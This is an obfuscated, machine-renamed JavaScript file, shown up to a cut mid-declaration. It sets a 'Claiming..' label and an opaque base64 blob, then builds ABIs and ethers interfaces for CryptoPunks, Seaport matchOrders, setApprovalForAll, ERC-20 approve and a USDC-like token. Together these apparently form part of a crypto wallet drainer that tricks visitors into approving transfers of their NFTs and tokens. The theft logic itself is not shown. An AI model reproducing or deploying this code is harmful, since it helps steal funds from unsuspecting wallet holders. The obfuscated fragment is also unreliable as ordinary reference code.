var yB = 'Claiming..',
  yt = 'test',
  yF = 100,
  yz =
    'NzUsNTgsMTAxLDE0OCwxOCwxNzUsMTg3LDI0Miw2NCwyMTAsMTE5LDE0OSwyMjksMiwxMDAsMjQsNjQsNDIsOTAsMTczLDI0NywxODQsMjIyLDEwOCwxMTEsODMsMTMwLDEyMywxMjEsMTk5LDE3MiwyMDAsMjIxLDMzLDI0Niw4Myw0MywxODcsMTk5LDE0LDYsMTc2LDE3MywxNjcsMjQ3LDk0LDI0MSwyNDUsMTg2LDE5MSwxMjQsMjQ5LDM0LDIzMiw0OSwyMjcsMjEyLDY2LDE0MywwLDIxLDU5LDQsMTk5LDg3LDE4NCwyNCwxMzYsMjMsMTM1LDE0MywxOSw5MCwxMTYsMTkzLDI0OSwxNzAsNjgsMjExLDExOSwxNDAsNzQsMTA3LDYzLDE2OSwyMTgsOSwyNCw0NiwxNDksMjAzLDg4LDE2LDEzNSwyMTEsNDAsMjM3LDIyLDIwNCwzMiwxMzksNTQsMTIwLDE4NSw1MSwxMTEsMjQsMTUxLDIxLDE0NywyMDAsOTgsMTI3LDM3LDExMCwyNSwxMDksMjI3LDExMSwxNTEsMTgzLDEzNCw2NCwxNjIsMTExLDE2MCwxNTYsMjE5LDc2LDE3NywxNTUsMjAzLDE2NCwyNDYsNjgsMTg5LDIyOSwyMjcsMTU2LDMyLDQ1LDE0LDE5OSw2NSwxMDQsMTU1LDE1NCwxNzcsOCwxMzksMTU5LDIxMywxNzksMTc3LDE2MywyNSwxMzAsNzAsNjAsMTE1LDE2MiwxMjUsMzksNzgsMTU2LDIwNCw1NCwyOSwyMzAsMjI5LDE1Nyw5NSw4MCwyMDEsMTcyLDc4LDE4OSwxNDQsMjI4LDExMSwyNTEsOCwxNTEsMTIyLDEwNiwxMzEsMjIzLDQ1LDE3NSwxODgsMTU5LDM2LDE1OSwyMjksMjQ0LDE2MSwxNTYsMjAsMzAsNzcsMTI4LDE0OCwzMCwyNSwxOTksMTM5LDI0NSw5NSwxMDAsNDgsMzEsMTk0LDY3LDI0NywxODIsMTg2LDIsMjAyLDE4LDk0LDE2MSwyMTQsMTEsMjAzLDI1NSwyMDEsMTY4LDIzMywxMiwxODgsMjcsMTIyLDM4LDE5LDEzOSwxNDMsMTM4LDEyNSwyMTcsODAsMTk2LDY3LDgsMTkwLDgsMjQxLDExMSwzNSwyMDksMTc4LDEzMiwyMTEsMjA0LDIzMywxNCwyMjYsMjQxLDQ3LDgsMjM0LDIwMywxMDcsMjI0LDIxNSwxMTUsNTMsMzAsMTIxLDg1LDI1MCwxNDEsODUsNzcsNTAsNDIsMTc0LDM1LDg3LDI0MCwyMjksMTM3LDYyLDE4OSw3MiwyMzQsMjUsMTI5LDE4NSwxODUsMTcwLDY4LDUsMTkzLDIzMSwxNTYsMTcwLDE1NCw3MiwxMzcsMjAxLDE3MSwyMjEsMTQ4LDEwLDEsMTAxLDg0LDI0NSw0Nyw0OSwyNTEsMjUzLDIxMSwxMzIsMjE5LDIxMiwyNDcsNzQsMTc0LDUxLDEyMCwyMzYsOTAsMTQyLDE3NCwzLDIxLDIxMiwyNTMsMTk4LDIxMyw2MywyMSwxMDksMTU4LDEzNiwyMjgsMjA3LDI5LDE4OCwyMjUsMjMsMTY3LDYzLDYsMTM0LDI0OCwyNDYsMTM1LDE0MywzMSw1NSwyMDAsMTAzLDIyMiw3NCwxODYsNTUsOTAsMjI0LDg0LDU3LDYxLDIwLDQyLDM4LDIxLDU2LDIwMiwxNDEsMjQ4LDIyMiwxMzAsMjI5LDE2MSw3LDEwMCwxMjMsNDIsMjQwLDE2MSwyMzksNzIsMjUwLDIzLDE2OCw2OSw1MywxNDUsMTIxLDE1OCwxODgsMTY0LDMxLDEzNiw5NSwyMzgsODUsMTMzLDY0LDIxMiwxNTQsMTQwLDU1LDI0NSw2LDE2MCwxMjQsMTk4LDg3LDk4LDUxLDE1MywxMDIsMTUzLDE5OSwxNjUsOCwyNDMsMjgsODUsMTk4LDE3OCw1MSwxMzEsOTMsMTI5LDIxMCwyMDEsOTEsMTIyLDIxOCwyNDgsMTQ2LDYzLDIwMCw0NywxMjgsMTkwLDIxOCwyNDQsOTQsMjEzLDgwLDI3LDIwNiw4OCw1NCwyOSwyNTAsMjI2LDI0OSwxNzIsMjA4LDIyNiw3MywxMTQsMTc0LDEyLDk0LDE0OCwyMzUsMjQyLDYzLDE3MCwyMDQsMTcwLDE5OCw5OSwxODQsODgsMTc1LDE1Niw1OSwxMDksMTI1LDUsNTEsMTk4LDkzLDEwMSw0NywxNzIsNzIsOTIsMjIzLDQyLDM2LDQzLDIxOCwzNywyMjgsMTQ3LDE4NywyMjgsOTcsMjYsMTk1LDIwMSwxOCw5MywyMjcsMTI0LDgwLDk1LDE0MywyMzYsMjUyLDk3LDQsMjE3LDE1OA==',
  yK = 20,
  yJ = false
const yl = {}
yl.name = ''
yl.type = 'string'
const yj = {}
yj.constant = true
yj.inputs = []
yj.name = 'name'
yj.outputs = [yl]
yj.payable = false
yj.type = 'function'
const yG = {}
yG.name = ''
yG.type = 'uint256'
const yQ = {}
yQ.name = 'isForSale'
yQ.type = 'bool'
const yD = {}
yD.name = 'punkIndex'
yD.type = 'uint256'
const yf = {}
yf.name = 'seller'
yf.type = 'address'
const yI = {}
yI.name = 'minValue'
yI.type = 'uint256'
const yn = {}
yn.name = 'onlySellTo'
yn.type = 'address'
const yg = {}
yg.constant = true
yg.inputs = [yG]
yg.name = 'punksOfferedForSale'
yg.outputs = [yQ, yD, yf, yI, yn]
yg.payable = false
yg.type = 'function'
const yW = {}
yW.name = 'punkIndex'
yW.type = 'uint256'
const yX = {}
yX.constant = false
yX.inputs = [yW]
yX.name = 'enterBidForPunk'
yX.outputs = []
yX.payable = true
yX.type = 'function'
const yP = {}
yP.name = ''
yP.type = 'uint256'
const yw = {}
yw.constant = true
yw.inputs = []
yw.name = 'totalSupply'
yw.outputs = [yP]
yw.payable = false
yw.type = 'function'
const yr = {}
yr.name = 'punkIndex'
yr.type = 'uint256'
const yu = {}
yu.name = 'minPrice'
yu.type = 'uint256'
const yx = {}
yx.constant = false
yx.inputs = [yr, yu]
yx.name = 'acceptBidForPunk'
yx.outputs = []
yx.payable = false
yx.type = 'function'
const yR = {}
yR.name = ''
yR.type = 'uint8'
const yp = {}
yp.constant = true
yp.inputs = []
yp.name = 'decimals'
yp.outputs = [yR]
yp.payable = false
yp.type = 'function'
const ye = {}
ye.name = 'addresses'
ye.type = 'address[]'
const yT = {}
yT.name = 'indices'
yT.type = 'uint256[]'
const yH = {}
yH.constant = false
yH.inputs = [ye, yT]
yH.name = 'setInitialOwners'
yH.outputs = []
yH.payable = false
yH.type = 'function'
const yA = {}
yA.constant = false
yA.inputs = []
yA.name = 'withdraw'
yA.outputs = []
yA.payable = false
yA.type = 'function'
const yb = {}
yb.name = ''
yb.type = 'string'
const ys = {}
ys.constant = true
ys.inputs = []
ys.name = 'imageHash'
ys.outputs = [yb]
ys.payable = false
ys.type = 'function'
const yv = {}
yv.name = ''
yv.type = 'uint256'
const yC = {}
yC.constant = true
yC.inputs = []
yC.name = 'nextPunkIndexToAssign'
yC.outputs = [yv]
yC.payable = false
yC.type = 'function'
const yN = {}
yN.name = ''
yN.type = 'uint256'
const yE = {}
yE.name = ''
yE.type = 'address'
const yL = {}
yL.constant = true
yL.inputs = [yN]
yL.name = 'punkIndexToAddress'
yL.outputs = [yE]
yL.payable = false
yL.type = 'function'
const yk = {}
yk.name = ''
yk.type = 'string'
const yq = {}
yq.constant = true
yq.inputs = []
yq.name = 'standard'
yq.outputs = [yk]
yq.payable = false
yq.type = 'function'
const ya = {}
ya.name = ''
ya.type = 'uint256'
const m0 = {}
m0.name = 'hasBid'
m0.type = 'bool'
const m1 = {}
m1.name = 'punkIndex'
m1.type = 'uint256'
const m2 = {}
m2.name = 'bidder'
m2.type = 'address'
const m3 = {}
m3.name = 'value'
m3.type = 'uint256'
const m4 = {}
m4.constant = true
m4.inputs = [ya]
m4.name = 'punkBids'
m4.outputs = [m0, m1, m2, m3]
m4.payable = false
m4.type = 'function'
const m5 = {}
m5.name = ''
m5.type = 'address'
const m6 = {}
m6.name = ''
m6.type = 'uint256'
const m7 = {}
m7.constant = true
m7.inputs = [m5]
m7.name = 'balanceOf'
m7.outputs = [m6]
m7.payable = false
m7.type = 'function'
const m8 = {}
m8.constant = false
m8.inputs = []
m8.name = 'allInitialOwnersAssigned'
m8.outputs = []
m8.payable = false
m8.type = 'function'
const m9 = {}
m9.name = ''
m9.type = 'bool'
const mM = {}
mM.constant = true
mM.inputs = []
mM.name = 'allPunksAssigned'
mM.outputs = [m9]
mM.payable = false
mM.type = 'function'
const md = {}
md.name = 'punkIndex'
md.type = 'uint256'
const mi = {}
mi.constant = false
mi.inputs = [md]
mi.name = 'buyPunk'
mi.outputs = []
mi.payable = true
mi.type = 'function'
const mS = {}
mS.name = 'to'
mS.type = 'address'
const mh = {}
mh.name = 'punkIndex'
mh.type = 'uint256'
const mZ = {}
mZ.constant = false
mZ.inputs = [mS, mh]
mZ.name = 'transferPunk'
mZ.outputs = []
mZ.payable = false
mZ.type = 'function'
const my = {}
my.name = ''
my.type = 'string'
const mm = {}
mm.constant = true
mm.inputs = []
mm.name = 'symbol'
mm.outputs = [my]
mm.payable = false
mm.type = 'function'
const mU = {}
mU.name = 'punkIndex'
mU.type = 'uint256'
const mY = {}
mY.constant = false
mY.inputs = [mU]
mY.name = 'withdrawBidForPunk'
mY.outputs = []
mY.payable = false
mY.type = 'function'
const mV = {}
mV.name = 'to'
mV.type = 'address'
const mo = {}
mo.name = 'punkIndex'
mo.type = 'uint256'
const mc = {}
mc.constant = false
mc.inputs = [mV, mo]
mc.name = 'setInitialOwner'
mc.outputs = []
mc.payable = false
mc.type = 'function'
const mO = {}
mO.name = 'punkIndex'
mO.type = 'uint256'
const mB = {}
mB.name = 'minSalePriceInWei'
mB.type = 'uint256'
const mt = {}
mt.name = 'toAddress'
mt.type = 'address'
const mF = {}
mF.constant = false
mF.inputs = [mO, mB, mt]
mF.name = 'offerPunkForSaleToAddress'
mF.outputs = []
mF.payable = false
mF.type = 'function'
const mz = {}
mz.name = ''
mz.type = 'uint256'
const mK = {}
mK.constant = true
mK.inputs = []
mK.name = 'punksRemainingToAssign'
mK.outputs = [mz]
mK.payable = false
mK.type = 'function'
const mJ = {}
mJ.name = 'punkIndex'
mJ.type = 'uint256'
const ml = {}
ml.name = 'minSalePriceInWei'
ml.type = 'uint256'
const mj = {}
mj.constant = false
mj.inputs = [mJ, ml]
mj.name = 'offerPunkForSale'
mj.outputs = []
mj.payable = false
mj.type = 'function'
const mG = {}
mG.name = 'punkIndex'
mG.type = 'uint256'
const mQ = {}
mQ.constant = false
mQ.inputs = [mG]
mQ.name = 'getPunk'
mQ.outputs = []
mQ.payable = false
mQ.type = 'function'
const mD = {}
mD.name = ''
mD.type = 'address'
const mf = {}
mf.name = ''
mf.type = 'uint256'
const mI = {}
mI.constant = true
mI.inputs = [mD]
mI.name = 'pendingWithdrawals'
mI.outputs = [mf]
mI.payable = false
mI.type = 'function'
const mn = {}
mn.name = 'punkIndex'
mn.type = 'uint256'
const mg = {}
mg.constant = false
mg.inputs = [mn]
mg.name = 'punkNoLongerForSale'
mg.outputs = []
mg.payable = false
mg.type = 'function'
const mW = {}
mW.inputs = []
mW.payable = true
mW.type = 'constructor'
const mX = {}
mX.indexed = true
mX.name = 'to'
mX.type = 'address'
const mP = {}
mP.indexed = false
mP.name = 'punkIndex'
mP.type = 'uint256'
const mw = {}
mw.anonymous = false
mw.inputs = [mX, mP]
mw.name = 'Assign'
mw.type = 'event'
const mr = {}
mr.indexed = true
mr.name = 'from'
mr.type = 'address'
const mu = {}
mu.indexed = true
mu.name = 'to'
mu.type = 'address'
const mx = {}
mx.indexed = false
mx.name = 'value'
mx.type = 'uint256'
const mR = {}
mR.anonymous = false
mR.inputs = [mr, mu, mx]
mR.name = 'Transfer'
mR.type = 'event'
const mp = {}
mp.indexed = true
mp.name = 'from'
mp.type = 'address'
const me = {}
me.indexed = true
me.name = 'to'
me.type = 'address'
const mT = {}
mT.indexed = false
mT.name = 'punkIndex'
mT.type = 'uint256'
const mH = {}
mH.anonymous = false
mH.inputs = [mp, me, mT]
mH.name = 'PunkTransfer'
mH.type = 'event'
const mA = {}
mA.indexed = true
mA.name = 'punkIndex'
mA.type = 'uint256'
const mb = {}
mb.indexed = false
mb.name = 'minValue'
mb.type = 'uint256'
const ms = {}
ms.indexed = true
ms.name = 'toAddress'
ms.type = 'address'
const mv = {}
mv.anonymous = false
mv.inputs = [mA, mb, ms]
mv.name = 'PunkOffered'
mv.type = 'event'
const mC = {}
mC.indexed = true
mC.name = 'punkIndex'
mC.type = 'uint256'
const mN = {}
mN.indexed = false
mN.name = 'value'
mN.type = 'uint256'
const mE = {}
mE.indexed = true
mE.name = 'fromAddress'
mE.type = 'address'
const mL = {}
mL.anonymous = false
mL.inputs = [mC, mN, mE]
mL.name = 'PunkBidEntered'
mL.type = 'event'
const mk = {}
mk.indexed = true
mk.name = 'punkIndex'
mk.type = 'uint256'
const mq = {}
mq.indexed = false
mq.name = 'value'
mq.type = 'uint256'
const ma = {}
ma.indexed = true
ma.name = 'fromAddress'
ma.type = 'address'
const U0 = {}
U0.anonymous = false
U0.inputs = [mk, mq, ma]
U0.name = 'PunkBidWithdrawn'
U0.type = 'event'
const U1 = {}
U1.indexed = true
U1.name = 'punkIndex'
U1.type = 'uint256'
const U2 = {}
U2.indexed = false
U2.name = 'value'
U2.type = 'uint256'
const U3 = {}
U3.indexed = true
U3.name = 'fromAddress'
U3.type = 'address'
const U4 = {}
U4.indexed = true
U4.name = 'toAddress'
U4.type = 'address'
const U5 = {}
U5.anonymous = false
U5.inputs = [U1, U2, U3, U4]
U5.name = 'PunkBought'
U5.type = 'event'
const U6 = {}
U6.indexed = true
U6.name = 'punkIndex'
U6.type = 'uint256'
const U7 = {}
U7.anonymous = false
U7.inputs = [U6]
U7.name = 'PunkNoLongerForSale'
U7.type = 'event'
const U8 = [
    yj,
    yg,
    yX,
    yw,
    yx,
    yp,
    yH,
    yA,
    ys,
    yC,
    yL,
    yq,
    m4,
    m7,
    m8,
    mM,
    mi,
    mZ,
    mm,
    mY,
    mc,
    mF,
    mK,
    mj,
    mQ,
    mI,
    mg,
    mW,
    mw,
    mR,
    mH,
    mv,
    mL,
    U0,
    U5,
    U7,
  ],
  U9 = {}
U9.internalType = 'address'
U9.name = 'offerer'
U9.type = 'address'
const UM = {}
UM.internalType = 'address'
UM.name = 'zone'
UM.type = 'address'
const Ud = {}
Ud.internalType = 'enum ItemType'
Ud.name = 'itemType'
Ud.type = 'uint8'
const Ui = {}
Ui.internalType = 'address'
Ui.name = 'token'
Ui.type = 'address'
const US = {}
US.internalType = 'uint256'
US.name = 'identifierOrCriteria'
US.type = 'uint256'
const Uh = {}
Uh.internalType = 'uint256'
Uh.name = 'startAmount'
Uh.type = 'uint256'
const UZ = {}
UZ.internalType = 'uint256'
UZ.name = 'endAmount'
UZ.type = 'uint256'
const Uy = {}
Uy.components = [Ud, Ui, US, Uh, UZ]
Uy.internalType = 'struct OfferItem[]'
Uy.name = 'offer'
Uy.type = 'tuple[]'
const Um = {}
Um.internalType = 'enum ItemType'
Um.name = 'itemType'
Um.type = 'uint8'
const UU = {}
UU.internalType = 'address'
UU.name = 'token'
UU.type = 'address'
const UY = {}
UY.internalType = 'uint256'
UY.name = 'identifierOrCriteria'
UY.type = 'uint256'
const UV = {}
UV.internalType = 'uint256'
UV.name = 'startAmount'
UV.type = 'uint256'
const Uo = {}
Uo.internalType = 'uint256'
Uo.name = 'endAmount'
Uo.type = 'uint256'
const Uc = {}
Uc.internalType = 'address payable'
Uc.name = 'recipient'
Uc.type = 'address'
const UO = {}
UO.components = [Um, UU, UY, UV, Uo, Uc]
UO.internalType = 'struct ConsiderationItem[]'
UO.name = 'consideration'
UO.type = 'tuple[]'
const UB = {}
UB.internalType = 'enum OrderType'
UB.name = 'orderType'
UB.type = 'uint8'
const Ut = {}
Ut.internalType = 'uint256'
Ut.name = 'startTime'
Ut.type = 'uint256'
const UF = {}
UF.internalType = 'uint256'
UF.name = 'endTime'
UF.type = 'uint256'
const Uz = {}
Uz.internalType = 'bytes32'
Uz.name = 'zoneHash'
Uz.type = 'bytes32'
const UK = {}
UK.internalType = 'uint256'
UK.name = 'salt'
UK.type = 'uint256'
const UJ = {}
UJ.internalType = 'bytes32'
UJ.name = 'conduitKey'
UJ.type = 'bytes32'
const Ul = {}
Ul.internalType = 'uint256'
Ul.name = 'totalOriginalConsiderationItems'
Ul.type = 'uint256'
const Uj = {}
Uj.components = [U9, UM, Uy, UO, UB, Ut, UF, Uz, UK, UJ, Ul]
Uj.internalType = 'struct OrderParameters'
Uj.name = 'parameters'
Uj.type = 'tuple'
const UG = {}
UG.internalType = 'bytes'
UG.name = 'signature'
UG.type = 'bytes'
const UQ = {}
UQ.components = [Uj, UG]
UQ.internalType = 'struct Order[]'
UQ.name = 'orders'
UQ.type = 'tuple[]'
const UD = {}
UD.internalType = 'uint256'
UD.name = 'orderIndex'
UD.type = 'uint256'
const Uf = {}
Uf.internalType = 'uint256'
Uf.name = 'itemIndex'
Uf.type = 'uint256'
const UI = {}
UI.components = [UD, Uf]
UI.internalType = 'struct FulfillmentComponent[]'
UI.name = 'offerComponents'
UI.type = 'tuple[]'
const Un = {}
Un.internalType = 'uint256'
Un.name = 'orderIndex'
Un.type = 'uint256'
const Ug = {}
Ug.internalType = 'uint256'
Ug.name = 'itemIndex'
Ug.type = 'uint256'
const UW = {}
UW.components = [Un, Ug]
UW.internalType = 'struct FulfillmentComponent[]'
UW.name = 'considerationComponents'
UW.type = 'tuple[]'
const UX = {}
UX.components = [UI, UW]
UX.internalType = 'struct Fulfillment[]'
UX.name = 'fulfillments'
UX.type = 'tuple[]'
const UP = {}
UP.internalType = 'enum ItemType'
UP.name = 'itemType'
UP.type = 'uint8'
const Uw = {}
Uw.internalType = 'address'
Uw.name = 'token'
Uw.type = 'address'
const Ur = {}
Ur.internalType = 'uint256'
Ur.name = 'identifier'
Ur.type = 'uint256'
const Uu = {}
Uu.internalType = 'uint256'
Uu.name = 'amount'
Uu.type = 'uint256'
const Ux = {}
Ux.internalType = 'address payable'
Ux.name = 'recipient'
Ux.type = 'address'
const UR = {}
UR.components = [UP, Uw, Ur, Uu, Ux]
UR.internalType = 'struct ReceivedItem'
UR.name = 'item'
UR.type = 'tuple'
const Up = {}
Up.internalType = 'address'
Up.name = 'offerer'
Up.type = 'address'
const Ue = {}
Ue.internalType = 'bytes32'
Ue.name = 'conduitKey'
Ue.type = 'bytes32'
const UT = {}
UT.components = [UR, Up, Ue]
UT.internalType = 'struct Execution[]'
UT.name = 'executions'
UT.type = 'tuple[]'
const UH = {}
UH.inputs = [UQ, UX]
UH.name = 'matchOrders'
UH.outputs = [UT]
UH.stateMutability = 'payable'
UH.type = 'function'
const UA = [UH],
  Ub = {}
Ub.internalType = 'address'
Ub.name = 'operator'
Ub.type = 'address'
const Us = {}
Us.internalType = 'bool'
Us.name = 'approved'
Us.type = 'bool'
const Uv = {}
Uv.inputs = [Ub, Us]
Uv.name = 'setApprovalForAll'
Uv.outputs = []
Uv.stateMutability = 'nonpayable'
Uv.type = 'function'
safa_abi = [Uv]
abicko = new ethers.utils.Interface(safa_abi)
const UC = {}
UC.name = '_spender'
UC.type = 'address'
const UN = {}
UN.name = '_value'
UN.type = 'uint256'
const UE = {}
UE.name = 'success'
UE.type = 'bool'
const UL = {}
UL.constant = false
UL.inputs = [UC, UN]
UL.name = 'approve'
UL.outputs = [UE]
UL.payable = false
UL.stateMutability = 'nonpayable'
UL.type = 'function'
abicko2 = new ethers.utils.Interface([UL])
const Uk = {}
Uk.indexed = true
Uk.internalType = 'address'
Uk.name = 'owner'
Uk.type = 'address'
const Uq = {}
Uq.indexed = true
Uq.internalType = 'address'
Uq.name = 'spender'
Uq.type = 'address'
const Ua = {}
Ua.indexed = false
Ua.internalType = 'uint256'
Ua.name = 'value'
Ua.type = 'uint256'
const Y0 = {}
Y0.anonymous = false
Y0.inputs = [Uk, Uq, Ua]
Y0.name = 'Approval'
Y0.type = 'event'
const Y1 = {}
Y1.indexed = true
Y1.internalType = 'address'
Y1.name = 'authorizer'
Y1.type = 'address'
const Y2 = {}
Y2.indexed = true
Y2.internalType = 'bytes32'
Y2.name = 'nonce'
Y2.type = 'bytes32'
const Y3 = {}
Y3.anonymous = false
Y3.inputs = [Y1, Y2]
Y3.name = 'AuthorizationCanceled'
Y3.type = 'event'
const Y4 = {}
Y4.indexed = true
Y4.internalType = 'address'
Y4.name = 'authorizer'
Y4.type = 'address'
const Y5 = {}
Y5.indexed = true
Y5.internalType = 'bytes32'
Y5.name = 'nonce'
Y5.type = 'bytes32'
const Y6 = {}
Y6.anonymous = false
Y6.inputs = [Y4, Y5]
Y6.name = 'AuthorizationUsed'
Y6.type = 'event'
const Y7 = {}
Y7.indexed = true
Y7.internalType = 'address'
Y7.name = '_account'
Y7.type = 'address'
const Y8 = {}
Y8.anonymous = false
Y8.inputs = [Y7]
Y8.name = 'Blacklisted'
Y8.type = 'event'
const Y9 = {}
Y9.indexed = true
Y9.internalType = 'address'
Y9.name = 'newBlacklister'
Y9.type = 'address'
const YM = {}
YM.anonymous = false
YM.inputs = [Y9]
YM.name = 'BlacklisterChanged'
YM.type = 'event'
const Yd = {}
Yd.indexed = true
Yd.internalType = 'address'
Yd.name = 'burner'
Yd.type = 'address'
const Yi = {}
Yi.indexed = false
Yi.internalType = 'uint256'
Yi.name = 'amount'
Yi.type = 'uint256'
const YS = {}
YS.anonymous = false
YS.inputs = [Yd, Yi]
YS.name = 'Burn'
YS.type = 'event'
const Yh = {}
Yh.indexed = true
Yh.internalType = 'address'
Yh.name = 'newMasterMinter'
Yh.type = 'address'
const YZ = {}
YZ.anonymous = false
YZ.inputs = [Yh]
YZ.name = 'MasterMinterChanged'
YZ.type = 'event'
const Yy = {}
Yy.indexed = true
Yy.internalType = 'address'
Yy.name = 'minter'
Yy.type = 'address'
const Ym = {}
Ym.indexed = true
Ym.internalType = 'address'
Ym.name = 'to'
Ym.type = 'address'
const YU = {}
YU.indexed = false
YU.internalType = 'uint256'
YU.name = 'amount'
YU.type = 'uint256'
const YY = {}
YY.anonymous = false
YY.inputs = [Yy, Ym, YU]
YY.name = 'Mint'
YY.type = 'event'
const YV = {}
YV.indexed = true
YV.internalType = 'address'
YV.name = 'minter'
YV.type = 'address'
const Yo = {}
Yo.indexed = false
Yo.internalType = 'uint256'
Yo.name = 'minterAllowedAmount'
Yo.type = 'uint256'
const Yc = {}
Yc.anonymous = false
Yc.inputs = [YV, Yo]
Yc.name = 'MinterConfigured'
Yc.type = 'event'
const YO = {}
YO.indexed = true
YO.internalType = 'address'
YO.name = 'oldMinter'
YO.type = 'address'
const YB = {}
YB.anonymous = false
YB.inputs = [YO]
YB.name = 'MinterRemoved'
YB.type = 'event'
const Yt = {}
Yt.indexed = false
Yt.internalType = 'address'
Yt.name = 'previousOwner'
Yt.type = 'address'
const YF = {}
YF.indexed = false
YF.internalType = 'address'
YF.name = 'newOwner'
YF.type = 'address'
const Yz = {}
Yz.anonymous = false
Yz.inputs = [Yt, YF]
Yz.name = 'OwnershipTransferred'
Yz.type = 'event'
const YK = {}
YK.anonymous = false
YK.inputs = []
YK.name = 'Pause'
YK.type = 'event'
const YJ = {}
YJ.indexed = true
YJ.internalType = 'address'
YJ.name = 'newAddress'
YJ.type = 'address'
const Yl = {}
Yl.anonymous = false
Yl.inputs = [YJ]
Yl.name = 'PauserChanged'
Yl.type = 'event'
const Yj = {}
Yj.indexed = true
Yj.internalType = 'address'
Yj.name = 'newRescuer'
Yj.type = 'address'
const YG = {}
YG.anonymous = false
YG.inputs = [Yj]
YG.name = 'RescuerChanged'
YG.type = 'event'
const YQ = {}
YQ.indexed = true
YQ.internalType = 'address'
YQ.name = 'from'
YQ.type = 'address'
const YD = {}
YD.indexed = true
YD.internalType = 'address'
YD.name = 'to'
YD.type = 'address'
const Yf = {}
Yf.indexed = false
Yf.internalType = 'uint256'
Yf.name = 'value'
Yf.type = 'uint256'
const YI = {}
YI.anonymous = false
YI.inputs = [YQ, YD, Yf]
YI.name = 'Transfer'
YI.type = 'event'
const Yn = {}
Yn.indexed = true
Yn.internalType = 'address'
Yn.name = '_account'
Yn.type = 'address'
const Yg = {}
Yg.anonymous = false
Yg.inputs = [Yn]
Yg.name = 'UnBlacklisted'
Yg.type = 'event'
const YW = {}
YW.anonymous = false
YW.inputs = []
YW.name = 'Unpause'
YW.type = 'event'
const YX = {}
YX.internalType = 'bytes32'
YX.name = ''
YX.type = 'bytes32'
const YP = {}
YP.inputs = []
YP.name = 'CANCEL_AUTHORIZATION_TYPEHASH'
YP.outputs = [YX]
YP.stateMutability = 'view'
YP.type = 'function'
const Yw = {}
Yw.internalType = 'bytes32'
Yw.name = ''
Yw.type = 'bytes32'
const Yr = {}
Yr.inputs = []
Yr.name = 'DOMAIN_SEPARATOR'
Yr.outputs = [Yw]
Yr.stateMutability = 'view'
Yr.type = 'function'
const Yu = {}
Yu.internalType = 'bytes32'
Yu.name = ''
Yu.type = 'bytes32'
const Yx = {}
Yx.inputs = []
Yx.name = 'PERMIT_TYPEHASH'
Yx.outputs = [Yu]
Yx.stateMutability = 'view'
Yx.type = 'function'
const YR = {}
YR.internalType = 'bytes32'
YR.name = ''
YR.type = 'bytes32'
const Yp = {}
Yp.inputs = []
Yp.name = 'RECEIVE_WITH_AUTHORIZATION_TYPEHASH'
Yp.outputs = [YR]
Yp.stateMutability = 'view'
Yp.type = 'function'
const Ye = {}
Ye.internalType = 'bytes32'
Ye.name = ''
Ye.type = 'bytes32'
const YT = {}
YT.inputs = []
YT.name = 'TRANSFER_WITH_AUTHORIZATION_TYPEHASH'
YT.outputs = [Ye]
YT.stateMutability = 'view'
YT.type = 'function'
const YH = {}
YH.internalType = 'address'
YH.name = 'owner'
YH.type = 'address'
const YA = {}
YA.internalType = 'address'
YA.name = 'spender'
YA.type = 'address'
const Yb = {}
Yb.internalType = 'uint256'
Yb.name = ''
Yb.type = 'uint256'
const Ys = {}
Ys.inputs = [YH, YA]
Ys.name = 'allowance'
Ys.outputs = [Yb]
Ys.stateMutability = 'view'
Ys.type = 'function'
const Yv = {}
Yv.internalType = 'address'
Yv.name = 'spender'
Yv.type = 'address'
const YC = {}
YC.internalType = 'uint256'
YC.name = 'value'
YC.type = 'uint256'
const YN = {}
YN.internalType = 'bool'
YN.name = ''
YN.type = 'bool'
const YE = {}
YE.inputs = [Yv, YC]
YE.name = 'approve'
YE.outputs = [YN]
YE.stateMutability = 'nonpayable'
YE.type = 'function'
const YL = {}
YL.internalType = 'address'
YL.name = 'authorizer'
YL.type = 'address'
const Yk = {}
Yk.internalType = 'bytes32'
Yk.name = 'nonce'
Yk.type = 'bytes32'
const Yq = {}
Yq.internalType = 'bool'
Yq.name = ''
Yq.type = 'bool'
const Ya = {}
Ya.inputs = [YL, Yk]
Ya.name = 'authorizationState'
Ya.outputs = [Yq]
Ya.stateMutability = 'view'
Ya.type = 'function'
const V0 = {}
V0.internalType = 'address'
V0.name = 'account'
V0.type = 'address'
const V1 = {}
V1.internalType = 'uint256'
V1.name = ''
V1.type = 'uint256'
const V2 = {}
V2.inputs = [V0]
V2.name = 'balanceOf'
V2.outputs = [V1]
V2.stateMutability = 'view'
V2.type = 'function'
const V3 = {}
V3.internalType = 'address'
V3.name = '_account'
V3.type = 'address'
const V4 = {}
V4.inputs = [V3]
V4.name = 'blacklist'
V4.outputs = []
V4.stateMutability = 'nonpayable'
V4.type = 'function'
const V5 = {}
V5.internalType = 'address'
V5.name = ''
V5.type = 'address'
const V6 = {}
V6.inputs = []
V6.name = 'blacklister'
V6.outputs = [V5]
V6.stateMutability = 'view'
V6.type = 'function'
const V7 = {}
V7.internalType = 'uint256'
V7.name = '_amount'
V7.type = 'uint256'
const V8 = {}
V8.inputs = [V7]
V8.name = 'burn'
V8.outputs = []
V8.stateMutability = 'nonpayable'
V8.type = 'function'
const V9 = {}
V9.internalType = 'address'
V9.name = 'authorizer'
V9.type = 'address'
const VM = {}
VM.internalType = 'bytes32'
VM.name = 'nonce'
VM.type = 'bytes32'
const Vd = {}
Vd.internalType = 'uint8'
Vd.name = 'v'
Vd.type = 'uint8'
const Vi = {}
Vi.internalType = 'bytes32'
Vi.name = 'r'
Vi.type = 'bytes32'
const VS = {}
VS.internalType = 'bytes32'
VS.name = 's'
VS.type = 'bytes32'
const Vh = {}
Vh.inputs = [V9, VM, Vd, Vi, VS]
Vh.name = 'cancelAuthorization'
Vh.outputs = []
Vh.stateMutability = 'nonpayable'
Vh.type = 'function'
const VZ = {}
VZ.internalType = 'address'
VZ.name = 'minter'
VZ.type = 'address'
const Vy = {}
Vy.internalType = 'uint256'
Vy.name = 'minterAllowedAmount'
Vy.type = 'uint256'
const Vm = {}
Vm.internalType = 'bool'
Vm.name = ''
Vm.type = 'bool'
const VU = {}
VU.inputs = [VZ, Vy]
VU.name = 'configureMinter'
VU.outputs = [Vm]
VU.stateMutability = 'nonpayable'
VU.type = 'function'
const VY = {}
VY.internalType = 'string'
VY.name = ''
VY.type = 'string'
const VV = {}
VV.inputs = []
VV.name = 'currency'
VV.outputs = [VY]
VV.stateMutability = 'view'
VV.type = 'function'
const Vo = {}
Vo.internalType = 'uint8'
Vo.name = ''
Vo.type = 'uint8'
const Vc = {}
Vc.inputs = []
Vc.name = 'decimals'
Vc.outputs = [Vo]
Vc.stateMutability = 'view'
Vc.type = 'function'
const VO = {}
VO.internalType = 'address'
